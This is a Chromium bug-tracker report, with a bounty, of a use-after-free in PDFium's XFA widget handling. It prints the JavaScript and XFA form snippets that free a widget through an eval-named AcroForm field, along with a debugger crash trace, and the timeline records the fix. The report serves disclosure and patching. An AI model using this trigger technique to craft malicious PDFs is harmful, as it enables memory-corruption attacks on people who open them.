# Security: PDFium (XFA) Use-after-free in CPDFSDK_Widget::HasXFAAAction

| Field | Value |
|-------|-------|
| **Issue ID** | [40095613](https://issues.chromium.org/issues/40095613) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | th...@chromium.org |
| **Created** | 2019-07-05 |
| **Bounty** | $5,000.00 |

## Description

**VERSION**  

Operating System: Windows 10 64bit  

Chrome with enabled XFA PDFium

**REPRODUCTION CASE**  

Open file `poc.pdf` in chrome.exe  

Click to check box to trigger crash (I change the size of check box to cover all the page so you can click to any place in PDF page)

VULNERABILITY  

CXFA\_FFWidget object use-after-free in function CPDFSDK\_Widget::HasXFAAAction

DETAIL INFORMATION

This poc file is a XFA Foreground type. When we click to a checkbox, the function `CFFL_InteractiveFormFiller::OnClick` is executed. Next is the function `CPDFSDK_Widget::HasXFAAAction`

```
bool CPDFSDK_Widget::HasXFAAAction(PDFSDK_XFAAActionType eXFAAAT) const {  
  CXFA_FFWidget\* hWidget = GetMixXFAWidget();  
  if (!hWidget)  
    return false;  
  
  CXFA_FFWidgetHandler\* pXFAWidgetHandler = GetXFAWidgetHandler();  
  if (!pXFAWidgetHandler)  
    return false;  
  
  XFA_EVENTTYPE eEventType = GetXFAEventType(eXFAAAT);  
  
  if ((eEventType == XFA_EVENT_Click || eEventType == XFA_EVENT_Change) &&  
      GetFieldType() == FormFieldType::kRadioButton) {  
    if (CXFA_FFWidget\* hGroupWidget = GetGroupMixXFAWidget()) {  
      CXFA_Node\* node = hGroupWidget->GetNode();  
      if (node->IsWidgetReady()) {  
        if (pXFAWidgetHandler->HasEvent(node, eEventType))  
          return true;  
      }  
    }  
  }  
  CXFA_Node\* node = hWidget->GetNode();  
  if (!node->IsWidgetReady())  
    return false;  
  return pXFAWidgetHandler->HasEvent(node, eEventType);  
}  

```

Cause poc file is XFA Foreground type, so it has 2 form types: AcroForm and XFA form. As we can see in above function, the function `GetMixXFAWidget` and `GetGroupMixXFAWidget` is used to get the XFA widget object from the AcroForm object's name. But i can manage to execute an javascript code in XFA context when these 2 function is called. To do this, i need to create Acroform and XFA form like below:

- In AcroForm, I setup a radio button type form named: `RadioList`. It has 2 checkbox widgets. I'll set one checkbox's name to an `eval` javascript expression to trigger callback. Cause the Acroform field object's name can not contain dot character (0x2e) so I setup a script in `initialize` event of the xfa root subform node

```
aa = 0;  
d = function() {  
		if (aa == 4)  
		{  
			field_DropDownList1 = xfa.resolveNode("xfa.form..ChoiceList1");  
			xfa.host.setFocus(field_DropDownList1);  
			xfa.template.remerge();      
			xfa.host.openList(field_DropDownList1);  
		}  
		aa += 1;  
	}        

```

It assigns the trigger functions to variablie `d` so we can call this without dot (0x2e) character. After that I change a name of the first checkbox to `(eval('d()')!=0)`. This javascript expression will be executed when the function `GetMixXFAWidget` and `GetGroupMixXFAWidget` is executed.

- In XFA form, i create an `exclGroup` named `RadioList` with 2 `checkButton` fields like below

```
	<exclGroup name="RadioList">  
		<traversal>  
			 <traverse ref="RadioList[0]"/>  
		</traversal>   
		<field h="5.1206mm" name="CheckBox5" w="29.1412mm" x="100.2977mm" y="178.6931mm">  
			<ui>  
				<checkButton>  
					...  
				</checkButton>  
			</ui>  
			...  
		</field>  
		<field h="5.1206mm" name="CheckBox5" w="29.1412mm" x="100.2977mm" y="178.6931mm">  
			<ui>  
				<checkButton>  
					...  
				</checkButton>  
			</ui>  
			...  
		</field>  
	</exclGroup>  

```

Back to function `CPDFSDK_Widget::HasXFAAAction`, we going to see the a process when the object is free by `eval` javascript expression callback and use again. First, it gets a XFA widget object base on name of AcroForm object by instruction

```
CXFA_FFWidget\* hWidget = GetMixXFAWidget();  

```

After that, it checks type of event and type of AcroForm form (I create a poc file that satisfy all condition), if event's type is `XFA_EVENT_Click`  

and form's type is `RadioButton`, the function `GetGroupMixXFAWidget` will be executed. This time, the javascript expression callback is triggered to free the `hWidget`. Finally, it backs to function `CPDFSDK_Widget::HasXFAAAction` and use again the freed widget object `hWidget`

```
CXFA_Node\* node = hWidget->GetNode();  

```

CRASH INFORMATION

```
(2358.1b2c): Access violation - code c0000005 (first chance)  
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.  
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\pdfium.dll  
eax=4e146fe4 ebx=0058d84c ecx=4e146fe4 edx=329d1b44 esi=0058d84c edi=b4aad152  
eip=320dc75a esp=0058d618 ebp=0058d61c iopl=0         nv up ei pl nz ac pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216  
pdfium!fxcrt::UnownedPtr::Get+0xa:  
320dc75a 8b00            mov     eax,dword ptr [eax]  ds:002b:4e146fe4=????????  
  
2:009> kp  
 # ChildEBP RetAddr    
00 0058d61c 320d9ad4 pdfium!fxcrt::UnownedPtr<CXFA_Node>::Get(void)+0xa [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\core\fxcrt\unowned_ptr.h @ 91]   
01 0058d628 320d9a13 pdfium!CXFA_FFWidget::GetNode(void)+0x14 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffwidget.h @ 133]   
02 0058d660 321235c2 pdfium!CPDFSDK_Widget::HasXFAAAction(<unnamed-tag> eXFAAAT = PDFSDK_XFA_Click (0n0))+0x103 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_widget.cpp @ 199]   
03 0058d6e0 321232e0 pdfium!CFFL_InteractiveFormFiller::OnClick(class fxcrt::ObservedPtr<CPDFSDK_Annot> \* pAnnot = 0x0058d84c, class CPDFSDK_PageView \* pPageView = 0x441a2fb8, unsigned int nFlag = 0x440)+0x62 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\formfiller\cffl_interactiveformfiller.cpp @ 756]   
04 0058d778 320dd4c3 pdfium!CFFL_InteractiveFormFiller::OnLButtonUp(class CPDFSDK_PageView \* pPageView = 0x441a2fb8, class fxcrt::ObservedPtr<CPDFSDK_Annot> \* pAnnot = 0x0058d84c, unsigned int nFlags = 0x440, class CFX_PTemplate<float> \* point = 0x0058d8a4)+0x250 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\formfiller\cffl_interactiveformfiller.cpp @ 254]   
05 0058d7c0 320b615b pdfium!CPDFSDK_WidgetHandler::OnLButtonUp(class CPDFSDK_PageView \* pPageView = 0x441a2fb8, class fxcrt::ObservedPtr<CPDFSDK_Annot> \* pAnnot = 0x0058d84c, unsigned int nFlags = 0x440, class CFX_PTemplate<float> \* point = 0x0058d8a4)+0x83 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_widgethandler.cpp @ 130]   
06 0058d800 320d6f11 pdfium!CPDFSDK_AnnotHandlerMgr::Annot_OnLButtonUp(class CPDFSDK_PageView \* pPageView = 0x441a2fb8, class fxcrt::ObservedPtr<CPDFSDK_Annot> \* pAnnot = 0x0058d84c, unsigned int nFlags = 0x440, class CFX_PTemplate<float> \* point = 0x0058d8a4)+0x9b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_annothandlermgr.cpp @ 148]   
07 0058d860 320fc218 pdfium!CPDFSDK_PageView::OnLButtonUp(class CFX_PTemplate<float> \* point = 0x0058d8a4, unsigned int nFlag = 0x440)+0x131 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_pageview.cpp @ 329]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\chrome.dll  
08 0058d8b8 1a22d793 pdfium!FORM_OnLButtonUp(struct fpdf_form_handle_t__ \* hHandle = 0x438f6fb8, struct fpdf_page_t__ \* page = 0x48006fe8, int modifier = 0n1088, double page_x = 206.2499847412109375, double page_y = 258)+0xc8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\fpdf_formfill.cpp @ 421]   
09 0058d9c0 1a22ccc6 chrome!chrome_pdf::PDFiumEngine::OnMouseUp(class pp::MouseInputEvent \* event = 0x0058db0c)+0x5c3 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 1467]   
0a 0058dbc8 1a250f1d chrome!chrome_pdf::PDFiumEngine::HandleEvent(class pp::InputEvent \* event = 0x0058dd38)+0x176 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 953]   
0b 0058dd4c 189eebf6 chrome!chrome_pdf::OutOfProcessInstance::HandleInputEvent(class pp::InputEvent \* event = 0x0058dd7c)+0x60d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\out_of_process_instance.cc @ 846]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\ppapi_proxy.dll  
0c 0058dd8c 7739a767 chrome!pp::InputEvent_HandleEvent(int pp_instance = 0n2000992709, int resource = 0n366)+0x96 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\cpp\module.cc @ 53]   
0d 0058ddbc 7739a6fa ppapi_proxy!ppapi::CallWhileUnlocked<PP_Bool,int,int,int,int>(<function> \* function = 0x189eeb60, int \* p1 = 0x0058de10, int \* p2 = 0x0058ddf4)+0x47 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\shared_impl\proxy_lock.h @ 136]   
0e 0058de08 7739b09e ppapi_proxy!ppapi::proxy::PPP_InputEvent_Proxy::OnMsgHandleFilteredInputEvent(int instance = 0n2000992709, struct ppapi::InputEventData \* data = 0x0058dfe0, <unnamed-tag> \* result = 0x0058df30)+0xaa [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\ppp_input_event_proxy.cc @ 107]   
0f 0058de4c 7739afc8 ppapi_proxy!base::DispatchToMethodImpl<ppapi::proxy::PPP_InputEvent_Proxy \*,void (class ppapi::proxy::PPP_InputEvent_Proxy \*\* obj = 0x0058e0b4, <function> \* method = 0x7739a650, class std::__1::tuple<int,ppapi::InputEventData> \* in = 0x0058dfd8, class std::__1::tuple<PP_Bool> \* out = 0x0058df30)+0x8e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\tuple.h @ 96]   
10 0058deb0 7739a5bc ppapi_proxy!base::DispatchToMethod<ppapi::proxy::PPP_InputEvent_Proxy \*,void (class ppapi::proxy::PPP_InputEvent_Proxy \*\* obj = 0x0058e0b4, <function> \* method = 0x7739a650, class std::__1::tuple<int,ppapi::InputEventData> \* in = 0x0058dfd8, class std::__1::tuple<PP_Bool> \* out = 0x0058df30)+0x98 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\tuple.h @ 105]   
11 0058e0a8 77399f8d ppapi_proxy!IPC::MessageT<PpapiMsg_PPPInputEvent_HandleFilteredInputEvent_Meta,std::__1::tuple<int,ppapi::InputEventData>,std::__1::tuple<PP_Bool> >::Dispatch<ppapi::proxy::PPP_InputEvent_Proxy,ppapi::proxy::PPP_InputEvent_Proxy,void,void (class IPC::Message \* \*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\message_support.dll  
msg = 0x30442fb8 {size = 0x90}, class ppapi::proxy::PPP_InputEvent_Proxy \* obj = 0x42d48fe8, class ppapi::proxy::PPP_InputEvent_Proxy \* sender = 0x42d48fe8, <function> \* func = 0x7739a650)+0x2cc [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ipc\ipc_message_templates.h @ 205]   
12 0058e120 772d97a7 ppapi_proxy!ppapi::proxy::PPP_InputEvent_Proxy::OnMessageReceived(class IPC::Message \* msg = 0x30442fb8 {size = 0x90})+0x14d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\ppp_input_event_proxy.cc @ 85]   
13 0058e1fc 77335c75 ppapi_proxy!ppapi::proxy::Dispatcher::OnMessageReceived(class IPC::Message \* msg = 0x30442fb8 {size = 0x90})+0x127 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\dispatcher.cc @ 70]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\ipc.dll  
14 0058e2d0 589588df ppapi_proxy!ppapi::proxy::PluginDispatcher::OnMessageReceived(class IPC::Message \* msg = 0x30442fb8 {size = 0x90})+0x2f5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\plugin_dispatcher.cc @ 273]   
15 0058e2f0 5895ebff ipc!IPC::ChannelProxy::Context::OnDispatchMessage(class IPC::Message \* message = 0x30442fb8 {size = 0x90})+0x8f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ipc\ipc_channel_proxy.cc @ 326]   
16 0058e318 5895eadc ipc!base::internal::FunctorTraits<void (<function> \* method = 0x58958850, class scoped_refptr<IPC::ChannelProxy::Context> \* receiver_ptr = 0x30442fb0 [0x589b10a0] 0x4550cf10 {...}, class IPC::Message \* args = 0x30442fb8 {size = 0x90})+0x4f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 499]   
17 0058e358 5895ea0f ipc!base::internal::InvokeHelper<0,void>::MakeItSo<void (<function> \*\* functor = 0x30442fa8, class scoped_refptr<IPC::ChannelProxy::Context> \* args = 0x30442fb0 [0x589b10a0] 0x4550cf10 {...}, class IPC::Message \* args = 0x30442fb8 {size = 0x90})+0x7c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 599]   
18 0058e37c 5895e8c4 ipc!base::internal::Invoker<base::internal::BindState<void (<function> \*\* functor = 0x30442fa8, class std::__1::tuple<scoped_refptr<IPC::ChannelProxy::Context>,IPC::Message> \* bound = 0x30442fb0)+0x6f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 672]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\base.dll  
19 0058e3a4 60301bb0 ipc!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x30442f90)+0x54 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 641]   
1a 0058e3c8 604d7d73 base!base::OnceCallback<void (void)+0x50 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\callback.h @ 98]   
1b 0058e650 6052d457 base!base::TaskAnnotator::RunTask(char \* trace_event_name = 0x606b949f "ThreadController::Task", struct base::PendingTask \* pending_task = 0x0058e998)+0x5b3 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\common\task_annotator.cc @ 144]   
1c 0058ea08 6052ca81 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow \* continuation_lazy_now = 0x0058eaa8, bool \* ran_task = 0x0058eac3)+0x737 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 368]   
1d 0058ead0 603c1ea0 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void)+0xb1 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 218]   
1e 0058eb30 6052e85c base!base::MessagePumpDefault::Run(class base::MessagePump::Delegate \* delegate = 0x41ba4f2c)+0x60 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\message_pump_default.cc @ 39]   
1f 0058edc4 60469d6b base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool application_tasks_allowed = true, class base::TimeDelta timeout = 9223372036854775807)+0x34c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 466]   
20 0058f078 60469a05 base!base::RunLoop::RunWithTimeout(class base::TimeDelta timeout = 9223372036854775807)+0x34b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\run_loop.cc @ 163]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\content.dll  
21 0058f0a0 1eb97315 base!base::RunLoop::Run(void)+0x45 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\run_loop.cc @ 131]   
22 0058f288 2298fc26 content!content::PpapiPluginMain(struct content::MainFunctionParams \* parameters = 0x0058f2fc)+0x5c5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\ppapi_plugin\ppapi_plugin_main.cc @ 160]   
23 0058f2b4 22990c75 content!content::RunOtherNamedProcessTypeMain(class std::__1::basic_string<char,std::__1::char_traits<char>,std::__1::allocator<char> > \* process_type = 0x0058f318 "ppapi", struct content::MainFunctionParams \* main_function_params = 0x0058f2fc, class content::ContentMainDelegate \* delegate = 0x0058f8e8)+0xa6 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 579]   
24 0058f470 2298c500 content!content::ContentMainRunnerImpl::Run(bool start_service_manager_only = false)+0x2c5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 876]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\embedder.dll  
25 0058f488 384e22e1 content!content::ContentServiceManagerMainDelegate::RunEmbedderProcess(void)+0x30 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_service_manager_main_delegate.cc @ 52]   
26 0058f808 2298fa4c embedder!service_manager::Main(struct service_manager::MainParams \* params = 0x0058f82c)+0x6d1 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\services\service_manager\embedder\main.cc @ 422]   
27 0058f854 163e1315 content!content::ContentMain(struct content::ContentMainParams \* params = 0x0058f8cc)+0x5c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main.cc @ 20]   
\*\*\* WARNING: Unable to verify checksum for chrome.exe  
28 0058f930 009d8e33 chrome!ChromeMain(struct HINSTANCE__ \* instance = 0x009d0000, struct sandbox::SandboxInterfaceInfo \* sandbox_info = 0x0058f9c4, int64 exe_entry_point_ticks = 0n394008932427)+0x1f5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_main.cc @ 110]   
29 0058fa28 009d1479 chrome_exe!MainDllLoader::Launch(struct HINSTANCE__ \* instance = 0x009d0000, class base::TimeTicks exe_entry_point_ticks = class base::TimeTicks)+0x453 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\main_dll_loader_win.cc @ 202]   
2a 0058fd08 00c0dd8e chrome_exe!wWinMain(struct HINSTANCE__ \* instance = 0x009d0000, struct HINSTANCE__ \* prev = 0x00000000)+0x479 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_exe_main_win.cc @ 229]   
2b 0058fd20 00c0dee1 chrome_exe!invoke_main(void)+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 123]   
2c 0058fd78 00c0dfad chrome_exe!__scrt_common_main_seh(void)+0x151 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 283]   
2d 0058fd80 00c0dfb8 chrome_exe!__scrt_common_main(void)+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 326]   
2e 0058fd88 75f80419 chrome_exe!wWinMainCRTStartup(void)+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wwinmain.cpp @ 17]   
2f 0058fd98 7706662d KERNEL32!BaseThreadInitThunk+0x19  
30 0058fdf4 770665fd ntdll!__RtlUserThreadStart+0x2f  
31 0058fe04 00000000 ntdll!_RtlUserThreadStart+0x1b  

```

## Attachments

- [poc.pdf](attachments/poc.pdf) (application/pdf, 112.5 KB)
- [crash-info.txt](attachments/crash-info.txt) (text/plain, 19.5 KB)

## Timeline

### li...@chromium.org (2019-07-08)

Hi Lei, would you be able to help take a look at this issue? Feel free to re-assign if you're not the right owner for this. Thanks!

[Monorail components: Internals>Plugins>PDF]

### th...@chromium.org (2019-07-08)

No impact since XFA is not shipped.

### th...@chromium.org (2019-07-08)

https://pdfium-review.googlesource.com/57353

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-07-08)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/1bd6c15c766419e0fc952909ea7ca5520093e74c

commit 1bd6c15c766419e0fc952909ea7ca5520093e74c
Author: Lei Zhang <thestig@chromium.org>
Date: Mon Jul 08 23:33:08 2019

Prevent a UAF in CPDFSDK_Widget::HasXFAAAction().

Calling GetMixXFAWidget() and GetGroupMixXFAWidget() can trigger JS and
invalidate widgets returned by previous calls. Use ObservedPtr to check
for CXFA_FFWidget destruction to catch this. Apply the same fix to
CPDFSDK_Widget::OnXFAAAction().

Bug: chromium:981528
Change-Id: I4d6cdd05135ccd7f57d53e8d011422de01921191
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/57353
Reviewed-by: Tom Sepez <tsepez@chromium.org>
Commit-Queue: Lei Zhang <thestig@chromium.org>

[modify] https://pdfium.googlesource.com/pdfium/+/1bd6c15c766419e0fc952909ea7ca5520093e74c/fpdfsdk/cpdfsdk_widget.cpp


### th...@chromium.org (2019-07-09)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-07-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/98cb167a15d4e0ef02c7129f538a63f37224ddcd

commit 98cb167a15d4e0ef02c7129f538a63f37224ddcd
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Jul 09 01:56:05 2019

Roll src/third_party/pdfium bf8ff1bc72b6..1bd6c15c7664 (2 commits)

https://pdfium.googlesource.com/pdfium.git/+log/bf8ff1bc72b6..1bd6c15c7664


git log bf8ff1bc72b6..1bd6c15c7664 --date=short --no-merges --format='%ad %ae %s'
2019-07-08 thestig@chromium.org Prevent a UAF in CPDFSDK_Widget::HasXFAAAction().
2019-07-08 tsepez@chromium.org Add CF test case for https://crbug.com/chromium/981288.


Created with:
  gclient setdep -r src/third_party/pdfium@1bd6c15c7664

The AutoRoll server is located here: https://autoroll.skia.org/r/pdfium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.



BUG=chromium:981528,chromium:981288
TBR=pdfium-deps-rolls@chromium.org

Change-Id: I45a23ee14465c8b52363ab0733714e7371d06f5c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1691556
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#675476}

[modify] https://crrev.com/98cb167a15d4e0ef02c7129f538a63f37224ddcd/DEPS


### sh...@chromium.org (2019-07-09)

[Empty comment from Monorail migration]

### na...@google.com (2019-07-15)

[Empty comment from Monorail migration]

### na...@google.com (2019-07-17)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2019-07-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-10-15)

This issue was migrated from crbug.com/chromium/981528?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095613)*
